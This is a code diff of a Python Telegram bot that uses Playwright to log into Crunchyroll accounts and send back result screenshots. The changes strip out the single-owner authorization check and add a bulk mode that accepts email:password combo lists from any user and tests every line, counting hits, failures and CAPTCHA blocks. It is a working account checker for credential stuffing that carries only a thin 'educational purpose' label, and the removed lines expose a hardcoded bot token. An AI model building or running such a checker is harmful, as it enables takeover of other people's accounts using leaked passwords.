@@ -1,50 +1,58 @@
 """
 ╔══════════════════════════════════════════════════════╗
-║                                                      ║
 ║   🔐 Crunchyroll Login Automation Bot                ║
-║   Educational Project - Cyber Security Class         ║
-║                                                      ║
+║   Made by @yorifederation                            ║
+║   For Educational Purpose Only                       ║
 ╚══════════════════════════════════════════════════════╝
 
-COMMANDS:
-  /start  - Welcome message
-  /help   - How to use
-  /chk email password - Login to Crunchyroll & send screenshot
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-BEFORE RUNNING:
-1. Edit TOKEN and CHAT_ID below (lines 15-16)
-2. Run: pip install -r user_requirements.txt
-3. Run: python -m playwright install chromium && python -m playwright install-deps
-4. Run: python main.py
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Commands:
+  /start  - Welcome with buttons
+  /help   - Instructions
+  /chk email password - Check login & screenshot
+  /bulk   - Bulk check from .txt file
 """
 
+import os
 import logging
 import asyncio
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, CallbackQueryHandler
 from playwright.async_api import async_playwright
 
 # ════════════════════════════════════════════════════════
-# 🔧 CONFIGURATION - SET THESE VALUES
+# 🔧 CONFIGURATION - From Environment
 # ════════════════════════════════════════════════════════
-TOKEN = "8702671509:AAH_W8e6MebctQtbzoV1sbV1gdJOaIEY77Q"           # Get from @BotFather
-CHAT_ID = 7728424218                    # Get from @userinfobot
+TOKEN = os.environ.get("BOT_TOKEN")
+
+if not TOKEN:
+    print("❌ Set BOT_TOKEN environment variable!")
+    exit(1)
 # ════════════════════════════════════════════════════════
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# Rate limiting
+user_last_request = {}
+RATE_LIMIT_SECONDS = 10
+
+
+async def is_rate_limited(user_id: int) -> bool:
+    import time
+    current_time = time.time()
+    if user_id in user_last_request:
+        if current_time - user_last_request[user_id] < RATE_LIMIT_SECONDS:
+            return True
+    user_last_request[user_id] = current_time
+    return False
+
 
 # ────────────────────────────────────────────────────────
-# 🤖 Crunchyroll Login Function
+# 🤖 LOGIN LOGIC (Working code)
 # ────────────────────────────────────────────────────────
 
 async def login_crunchyroll(email: str, password: str) -> dict:
-    """Login to Crunchyroll and return result with screenshot"""
+    """Login to Crunchyroll using SSO page"""
     
     async with async_playwright() as p:
         browser = await p.chromium.launch(headless=True)
@@ -56,108 +64,175 @@ async def login_crunchyroll(email: str, password: str) -> dict:
         result = {"success": False, "screenshot": None, "message": ""}
         
         try:
-            # 1. Open Crunchyroll login page
-            await page.goto("https://www.crunchyroll.com/login", timeout=60000)
-            await page.wait_for_load_state("networkidle", timeout=30000)
+            # 1. Go to SSO login page
+            sso_url = "https://sso.crunchyroll.com/login?return_url=%2Fauthorize%3Fclient_id%3Dkmj7imhjt_q90lcbzzsj%26redirect_uri%3Dhttps%253A%252F%252Fwww.crunchyroll.com%252Fcallback%26response_type%3Dcookie%26state%3D"
+            
+            await page.goto(sso_url, timeout=60000)
+            await page.wait_for_load_state("domcontentloaded", timeout=30000)
             await asyncio.sleep(2)
             
-            # 2. Find email field - try multiple selectors
-            email_field = None
-            selectors = [
-                "input[type='email']", "input[name='email']", "input[id*='email']",
-                "input[placeholder*='email' i]", "input[autocomplete='email']",
-                "input[id='email-input']", "input[name='signin-email']"
+            # 2. Handle cookie consent FIRST
+            logger.info("Handling cookie consent...")
+            
+            cookie_selectors = [
+                "button:has-text('Accept All')",
+                "button:has-text('Accept all')",
+                "button:has-text('ACCEPT ALL')",
+                "button[data-testid='accept-button']",
+                "#onetrust-accept-btn-handler",
+                ".onetrust-accept-btn-handler",
+                "button:has-text('Allow All')",
+                "button:has-text('ALLOW ALL')"
             ]
-            for sel in selectors:
+            
+            for sel in cookie_selectors:
                 try:
-                    email_field = await page.wait_for_selector(sel, timeout=2000)
-                    break
+                    btn = await page.wait_for_selector(sel, timeout=2000)
+                    if btn:
+                        await btn.click()
+                        logger.info(f"Clicked cookie button: {sel}")
+                        await asyncio.sleep(1)
+                        break
                 except:
-                    continue
+                    pass
+            
+            # Take screenshot
+            result["screenshot"] = await page.screenshot()
+            
+            # 3. Find email field - use name='login'
+            email_field = None
+            
+            try:
+                email_field = await page.wait_for_selector("input[name='login']", timeout=3000)
+                logger.info("Found email field with name='login'")
+            except:
+                pass
+            
+            # Fallback selectors
+            if not email_field:
+                for sel in ["input[name='login']", "input[type='text']", "#login"]:
+                    try:
+                        email_field = await page.wait_for_selector(sel, timeout=2000)
+                        break
+                    except:
+                        pass
             
             if not email_field:
-                result["message"] = "❌ Email field not found on page"
-                result["screenshot"] = await page.screenshot()
+                result["message"] = "❌ Email field not found"
                 return result
             
-            # 3. Find password field
+            # 4. Fill email
+            await email_field.fill(email)
+            await asyncio.sleep(1)
+            
+            # 5. Press Tab to trigger password field
+            await email_field.press("Tab")
+            await asyncio.sleep(1)
+            
+            # Take screenshot after email
+            result["screenshot"] = await page.screenshot()
+            
+            # 6. Find password field
             password_field = None
-            p_selectors = [
-                "input[type='password']", "input[name='password']",
-                "input[id*='password']", "input[id='password-input']"
+            password_selectors = [
+                "input[name='password']",
+                "input[type='password']",
+                "input[id='password']",
+                "input[autocomplete='new-password']"
             ]
-            for sel in p_selectors:
+            
+            for sel in password_selectors:
                 try:
-                    password_field = await page.wait_for_selector(sel, timeout=2000)
+                    password_field = await page.wait_for_selector(sel, timeout=3000)
+                    logger.info(f"Found password field: {sel}")
                     break
                 except:
-                    continue
+                    pass
             
             if not password_field:
-                result["message"] = "❌ Password field not found on page"
-                result["screenshot"] = await page.screenshot()
+                await email_field.press("Enter")
+                await asyncio.sleep(2)
+                
+                for sel in password_selectors:
+                    try:
+                        password_field = await page.wait_for_selector(sel, timeout=3000)
+                        break
+                    except:
+                        pass
+            
+            if not password_field:
+                inputs = await page.query_selector_all("input")
+                for inp in inputs:
+                    t = await inp.get_attribute("type")
+                    n = await inp.get_attribute("name")
+                    if t == "password" or "password" in str(n).lower():
+                        password_field = inp
+                        break
+            
+            if not password_field:
+                result["message"] = "❌ Password field not found - may need captcha"
                 return result
             
-            # 4. Fill the form
-            await email_field.fill(email)
-            await asyncio.sleep(0.3)
+            # 7. Fill password
             await password_field.fill(password)
-            await asyncio.sleep(0.3)
+            await asyncio.sleep(0.5)
             
             # Take screenshot of filled form
             result["screenshot"] = await page.screenshot()
             
-            # 5. Click submit - try multiple buttons
-            submit = None
+            # 8. Find and click submit button
+            submit_button = None
             submit_selectors = [
-                "button[type='submit']", "input[type='submit']",
-                "button:has-text('Sign In')", "button:has-text('Log In')",
-                "button[class*='submit']", "button[class*='SignIn']"
+                "button[type='submit']",
+                "button:has-text('NEXT')",
+                "button:has-text('Sign In')",
+                "button:has-text('LOGIN')",
+                "input[type='submit']",
+                "[data-testid='submit']"
             ]
+            
             for sel in submit_selectors:
                 try:
-                    submit = await page.wait_for_selector(sel, timeout=2000)
-                    break
+                    submit_button = await page.wait_for_selector(sel, timeout=2000)
+                    if submit_button:
+                        break
                 except:
-                    continue
+                    pass
             
-            if submit:
-                await submit.click()
+            if submit_button:
+                await submit_button.click()
             else:
                 await password_field.press("Enter")
             
-            # 6. Wait for response
-            await asyncio.sleep(5)
-            await page.wait_for_load_state("networkidle", timeout=30000)
-            await asyncio.sleep(2)
+            # 9. Wait for response
+            await asyncio.sleep(8)
+            await page.wait_for_load_state("domcontentloaded", timeout=30000)
+            await asyncio.sleep(3)
             
-            # 7. Take result screenshot
-            final_screenshot = await page.screenshot()
-            result["screenshot"] = final_screenshot
+            # 10. Take final screenshot
+            result["screenshot"] = await page.screenshot()
             
-            # 8. Check if login worked
-            current_url = page.url.lower()
+            # 11. Check result
+            final_url = page.url.lower()
             page_content = await page.content()
             
-            if "login" not in current_url or "/login" not in current_url:
-                # Check for error messages
-                error_found = await page.query_selector(".form-error, .error-message, [class*='error']")
-                if error_found:
-                    error_text = await error_found.inner_text()
-                    result["message"] = f"❌ Login Failed\n\n{error_text[:150]}"
-                else:
-                    result["success"] = True
-                    result["message"] = "✅ Login Successful!\n\nRedirected to: " + page.url[:60]
+            if "recaptcha" in page_content.lower() or "captcha" in page_content.lower():
+                result["message"] = "⚠️ CAPTCHA Blocked"
+            elif "incorrect" in page_content.lower() or "wrong" in page_content.lower():
+                result["message"] = "❌ Wrong email or password"
+            elif "sso.crunchyroll.com/login" in final_url:
+                result["message"] = "❌ Login not successful"
             else:
-                # Still on login page - check why
-                if "incorrect" in page_content.lower() or "wrong" in page_content.lower():
-                    result["message"] = "❌ Wrong email or password"
-                else:
-                    result["message"] = "❌ Login not successful - check credentials"
-                    
+                result["success"] = True
+                result["message"] = "✅ Login Successful!"
+                
         except Exception as e:
             logger.error(f"Login error: {e}")
-            result["message"] = f"❌ Error: {str(e)[:100]}"
+            result["message"] = f"❌ Error: {str(e)[:150]}"
+            try:
+                result["screenshot"] = await page.screenshot()
+            except:
+                pass
         
         finally:
             await browser.close()
@@ -166,98 +241,99 @@ async def login_crunchyroll(email: str, password: str) -> dict:
 
 
 # ────────────────────────────────────────────────────────
-# 📱 Telegram Command Handlers
+# 📱 TELEGRAM HANDLERS
 # ────────────────────────────────────────────────────────
 
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Professional welcome message"""
-    if str(update.message.chat_id) != str(CHAT_ID):
-        await update.message.reply_text("❌ Unauthorized")
-        return
+    """Professional welcome with inline buttons"""
+    keyboard = [
+        [InlineKeyboardButton("🔐 Check Login", callback_data="check")],
+        [InlineKeyboardButton("📋 Help", callback_data="help")],
+        [InlineKeyboardButton("📁 Bulk Check", callback_data="bulk")],
+        [InlineKeyboardButton("👨‍💻 By @yorifederation", url="https://t.me/yorifederation")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
     
-    welcome = """
-🔐 *Crunchyroll Login Bot*
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+    welcome = """🏠 *Welcome to Crunchyroll Login Bot*
 
-👋 *Welcome!*
+━━━━━━━━━━━━━━━━━━━━━━
+This bot checks Crunchyroll account login status and sends screenshots.
+━━━━━━━━━━━━━━━━━━━━━━
 
-This bot demonstrates web login automation for your cybersecurity class project.
+🔐 *Features:*
+• Single account check
+• Bulk check from .txt file
+• Screenshot capture
+• Accurate results
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━
 
-📋 *Commands:*
+📝 *Commands:*
+`/chk email password` - Check single account
+`/bulk` - Send .txt file with accounts
+`/help` - Full instructions
 
-• `/chk email password` - Login & screenshot
-• `/help` - Instructions
+━━━━━━━━━━━━━━━━━━━━━━
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-💡 *Example:*
-`/chk myemail@gmail.com MyPass123`
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-"""
-    await update.message.reply_text(welcome, parse_mode='Markdown')
+Made with ❤️ by *@yorifederation*"""
+    
+    await update.message.reply_text(welcome, reply_markup=reply_markup, parse_mode='Markdown')
 
 
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Full instructions"""
-    if str(update.message.chat_id) != str(CHAT_ID):
-        await update.message.reply_text("❌ Unauthorized")
-        return
-    
-    help_text = """
-📚 *How to Use*
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+    """Full help documentation"""
+    help_text = """📚 *Help & Instructions*
 
-🎯 *Main Command:*
+━━━━━━━━━━━━━━━━━━━━━━
 
+🔐 *Single Check:*
 `/chk email password`
 
 Example:
 ```
-/chk student@gmail.com SecretPass
+/chk user@gmail.com MyPass123
 ```
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━
 
-🔄 *What it does:*
+📁 *Bulk Check:*
+Send a .txt file with accounts
+Format: `email:password`
+(One per line)
 
-1. Opens Crunchyroll login page
-2. Fills email & password
-3. Clicks Sign In
-4. Takes screenshot
-5. Sends result to you
+━━━━━━━━━━━━━━━━━━━━━━
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+📸 *What you get:*
+• Login status (success/fail)
+• Screenshot of result
+• Masked email in caption
 
-📊 *Results:*
+━━━━━━━━━━━━━━━━━━━━━━
 
-✅ *Success* → Dashboard screenshot
-❌ *Failed* → Error message screenshot
+⚠️ *Note:*
+• CAPTCHA may block some attempts
+• Rate limit between checks
+• Use your own credentials
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━
 
-🔒 *Security:*
-• Uses YOUR credentials only
-• Processed locally only
-• No data stored anywhere
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-"""
+Made by *@yorifederation*"""
+    
     await update.message.reply_text(help_text, parse_mode='Markdown')
 
 
 async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Main login check command"""
-    if str(update.message.chat_id) != str(CHAT_ID):
-        await update.message.reply_text("❌ Unauthorized")
+    """Check single account"""
+    user_id = update.message.from_user.id
+    
+    # Rate limit check
+    if await is_rate_limited(user_id):
+        await update.message.reply_text("⏳ Please wait 10 seconds between requests!")
         return
     
     if not context.args or len(context.args) < 2:
         await update.message.reply_text(
-            "🔐 *Usage:* `/chk email password`\n\n"
-            "*Example:* `/chk my@email.com mypass`",
+            "🔐 *Usage:* `/chk email password`\n\nExample: `/chk user@gmail.com pass123`",
             parse_mode='Markdown'
         )
         return
@@ -265,79 +341,188 @@ async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     email = context.args[0]
     password = " ".join(context.args[1:])
     
-    # Validate email
-    if "@" not in email or "." not in email.split("@")[-1]:
+    if "@" not in email:
         await update.message.reply_text("❌ Invalid email format")
         return
     
-    # Show processing message
-    msg = await update.message.reply_text(
-        "🔄 *Processing...*\n\n"
-        "⏳ Opening Crunchyroll\n"
-        "⏳ Filling form\n"
-        "⏳ Submitting\n"
-        "⏳ Capturing screenshot\n\n"
-        "Please wait...",
-        parse_mode='Markdown'
-    )
+    msg = await update.message.reply_text("🔄 *Processing...* Please wait 15-20 seconds", parse_mode='Markdown')
     
     logger.info(f"Login attempt: {email}")
-    
-    # Run login
     result = await login_crunchyroll(email, password)
     
-    # Send result
+    # Build response
     if result["success"]:
-        await msg.edit_text("✅ " + result["message"])
+        status_icon = "✅"
+        status_text = "*LOGIN SUCCESS!*"
+    elif "CAPTCHA" in result["message"]:
+        status_icon = "⚠️"
+        status_text = "*CAPTCHA BLOCKED*"
     else:
-        await msg.edit_text(result["message"])
+        status_icon = "❌"
+        status_text = "*LOGIN FAILED*"
+    
+    masked_email = f"{email[:3]}***@{email.split('@')[1]}"
+    
+    await msg.edit_text(f"{status_icon} {status_text}\n📧 {masked_email}\n📝 {result['message']}")
     
     if result["screenshot"]:
-        masked_email = f"{email[:3]}***@{email.split('@')[1]}"
         await update.message.reply_photo(
             photo=result["screenshot"],
-            caption=f"📸 Result: {masked_email}"
+            caption=f"📸 Result • {masked_email}"
+        )
+
+
+async def cmd_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Instructions for bulk check"""
+    keyboard = [
+        [InlineKeyboardButton("📁 Send .txt File", callback_data="send_file")]
+    ]
+    
+    await update.message.reply_text(
+        "📁 *Bulk Check Mode*\n\n"
+        "Send a .txt file with accounts:\n\n"
+        "Format:\n"
+        "```\nemail1:password1\n"
+        "email2:password2\n"
+        "email3:password3\n"
+        "```\n\n"
+        "🔹 One account per line\n"
+        "🔹 Format: `email:password`\n"
+        "🔹 Password can contain `:`",
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode='Markdown'
+    )
+
+
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle .txt file upload for bulk check"""
+    doc = update.message.document
+    
+    if not doc.file_name.endswith('.txt'):
+        await update.message.reply_text("❌ Please send a .txt file only")
+        return
+    
+    # Download file
+    file = await doc.download()
+    file_path = file.name
+    
+    await update.message.reply_text(f"📁 File received: `{doc.file_name}`\n🔄 Processing...", parse_mode='Markdown')
+    
+    # Process bulk
+    try:
+        with open(file_path, 'r') as f:
+            lines = f.readlines()
+        
+        total = success = failed = captcha = 0
+        
+        status_msg = await update.message.reply_text(f"📊 Processing {len(lines)} accounts...")
+        
+        for i, line in enumerate(lines):
+            line = line.strip()
+            if not line or ":" not in line:
+                continue
+            
+            parts = line.split(":")
+            if len(parts) < 2:
+                continue
+            
+            email = parts[0]
+            password = ":".join(parts[1:])
+            total += 1
+            
+            result = await login_crunchyroll(email, password)
+            
+            if result["success"]:
+                status = "✅"
+                success += 1
+            elif "CAPTCHA" in result["message"]:
+                status = "⚠️"
+                captcha += 1
+            else:
+                status = "❌"
+                failed += 1
+            
+            masked_email = f"{email[:3]}***@{email.split('@')[1]}" if "@" in email else f"{email[:3]}***"
+            
+            await context.bot.send_message(
+                chat_id=update.message.chat_id,
+                text=f"{status} `{masked_email}` - {result['message']}",
+                parse_mode='Markdown'
+            )
+            
+            if result["screenshot"]:
+                await context.bot.send_photo(
+                    chat_id=update.message.chat_id,
+                    photo=result["screenshot"],
+                    caption=f"📸 `{masked_email}`"
+                )
+            
+            await asyncio.sleep(2)
+            
+            if (i + 1) % 5 == 0:
+                await status_msg.edit_text(f"📊 Progress: {i+1}/{len(lines)}\n✅ {success} | ❌ {failed} | ⚠️ {captcha}")
+        
+        await status_msg.edit_text(
+            f"📊 *Bulk Check Complete*\n\n"
+            f"Total: {total}\n"
+            f"✅ Success: {success}\n"
+            f"❌ Failed: {failed}\n"
+            f"⚠️ CAPTCHA: {captcha}",
+            parse_mode='Markdown'
+        )
+        
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error reading file: {str(e)}")
+    finally:
+        try:
+            os.remove(file_path)
+        except:
+            pass
+
+
+async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle callback queries"""
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == "check":
+        await query.edit_message_text(
+            "🔐 *Single Check*\n\nSend: `/chk email password`\n\nExample: `/chk user@gmail.com pass123`",
+            parse_mode='Markdown'
+        )
+    elif query.data == "help":
+        await cmd_help(query, context)
+    elif query.data == "bulk":
+        await query.edit_message_text(
+            "📁 *Bulk Check*\n\nSend your .txt file with accounts\n\nFormat:\n`email:password`\n(one per line)",
+            parse_mode='Markdown'
         )
 
 
 # ────────────────────────────────────────────────────────
-# 🚀 Main
+# 🚀 MAIN
 # ────────────────────────────────────────────────────────
 
 def main():
     print("""
 ╔════════════════════════════════════════╗
 ║   🔐 Crunchyroll Login Bot             ║
-║   Educational Project                  ║
+║   Made by @yorifederation              ║
 ╚════════════════════════════════════════╝
     """)
     
-    if TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print("❌ SETUP REQUIRED!")
-        print("")
-        print("1. Edit main.py → Set TOKEN (line 15)")
-        print("2. Edit main.py → Set CHAT_ID (line 16)")
-        print("")
-        print("How to get TOKEN:")
-        print("  Telegram → @BotFather → /newbot")
-        print("")
-        print("How to get CHAT_ID:")
-        print("  Telegram → @userinfobot → send message")
-        print("")
-        print("First time setup:")
-        print("  pip install -r user_requirements.txt")
-        print("  python -m playwright install chromium")
-        print("  python -m playwright install-deps")
-        return
-    
-    print("✅ Bot starting...")
-    
     app = Application.builder().token(TOKEN).build()
+    
     app.add_handler(CommandHandler("start", cmd_start))
     app.add_handler(CommandHandler("help", cmd_help))
     app.add_handler(CommandHandler("chk", cmd_chk))
+    app.add_handler(CommandHandler("bulk", cmd_bulk))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    app.add_handler(CallbackQueryHandler(callback_handler))
     
-    print("✅ Running! Message /start to your bot")
+    print("✅ Bot is running!")
+    print("   Send /start to your bot\n")
+    
     app.run_polling()
 
 
